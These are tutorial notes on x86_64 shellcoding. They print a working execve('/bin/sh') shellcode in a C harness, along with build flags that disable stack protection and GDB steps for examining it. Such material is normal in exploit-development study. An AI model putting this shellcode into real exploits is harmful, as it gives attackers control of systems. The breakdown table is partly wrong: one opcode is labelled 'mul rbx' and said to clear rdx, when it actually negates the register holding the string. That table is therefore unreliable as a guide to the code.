# Shellcoding Notes

## **What is Shellcode?**
Shellcode is machine code designed to perform a specific task when executed. It is used in exploits to gain control over a system. Some common shellcode functionalities include:

- Spawning a local shell.
- Binding to a port and spawning a shell.
- Creating a new user account.

Shellcode is executed directly by the CPU and does not require further assembling, linking, or separate compiling.

---

## **How is Shellcode Delivered?**

Shellcode is usually delivered as part of an exploit. Important factors include:

- **Size Considerations:** A smaller shellcode is often better for exploitability.
- **Bad Characters:** Null bytes (`0x00`) and other special characters can break shellcode execution.
- **Execution Methods:**
  - Injected into an executable and executed as a new thread.
  - Overwriting existing executable functionality.

---

## **Shellcode Resources**
- [Shell-Storm](http://www.shell-storm.org/)
- [Exploit-DB](http://exploit-db.com)
- [Project Shellcode](http://www.projectshellcode.com/)

---

## **Analyzing Shellcode Using GDB**

The following shellcode spawns a shell (`/bin/sh`) using the `execve` system call in x86_64 assembly:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
    printf("Shellcode Length:  %d\n", (int)strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
```

### **Step-by-Step Execution in GDB**
1. **Compile the program without stack protection:**
   ```sh
   gcc -z execstack -fno-stack-protector shellcode.c -o shellcode
   ```

2. **Run GDB and disassemble the shellcode:**
   ```sh
   gdb -q ./shellcode
   (gdb) disassemble main
   ```

3. **Set a breakpoint at shellcode execution:**
   ```sh
   (gdb) break *ret
   (gdb) run
   ```

4. **Inspect the registers and shellcode execution:**
   ```sh
   (gdb) info registers
   (gdb) x/20xb code
   ```

### **Shellcode Breakdown:**
| Instruction | Opcode | Description |
|------------|--------|-------------|
| `xor eax, eax` | `\x31\xc0` | Clears `eax` (sets to 0) |
| `mov rbx, 0xff978cd091969dd1` | `\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff` | Moves `/bin/sh` string into `rbx` |
| `mul rbx` | `\x48\xf7\xdb` | Clears `rdx` (sets to 0) |
| `push rbx` | `\x53` | Push `/bin/sh` onto stack |
| `push rsp` | `\x54` | Push address of `/bin/sh` onto stack |
| `pop rdi` | `\x5f` | Set `rdi` to point to `/bin/sh` |
| `cdq` | `\x99` | Clears `rdx` |
| `push rdx` | `\x52` | Push NULL byte (terminates `/bin/sh` string) |
| `push rdi` | `\x57` | Push `/bin/sh` address again |
| `push rsp` | `\x54` | Push pointer to `argv[]` |
| `pop rsi` | `\x5e` | Set `rsi` to pointer of `argv[]` |
| `mov al, 59` | `\xb0\x3b` | Set `eax` to syscall number 59 (`execve`) |
| `syscall` | `\x0f\x05` | Execute the syscall |

### **Final Execution Output:**
Once the shellcode is executed successfully, a new shell (`/bin/sh`) should be spawned.

---

## **Conclusion**
- Shellcode is an essential part of exploit development.
- It should be small, free of bad characters, and properly tested in a debugger like GDB.
- Understanding assembly instructions and register usage is crucial for shellcoding.

